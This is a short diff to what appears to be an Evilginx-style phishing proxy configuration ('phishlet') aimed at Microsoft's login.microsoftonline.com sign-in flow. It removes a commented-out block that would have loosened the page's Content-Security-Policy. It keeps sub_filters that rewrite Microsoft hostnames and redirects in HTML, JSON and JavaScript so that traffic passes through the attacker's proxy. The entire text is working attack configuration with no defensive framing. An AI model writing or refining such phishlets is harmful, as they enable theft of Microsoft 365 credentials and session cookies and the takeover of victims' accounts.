@@ -28,14 +28,6 @@ proxy_hosts:
 
 
 sub_filters:
-  # - {
-  #     triggers_on: "login.microsoftonline.com",
-  #     orig_sub: "",
-  #     domain: "",
-  #     
-  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
-  #     mimes: ["text/html"],
-  #   }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
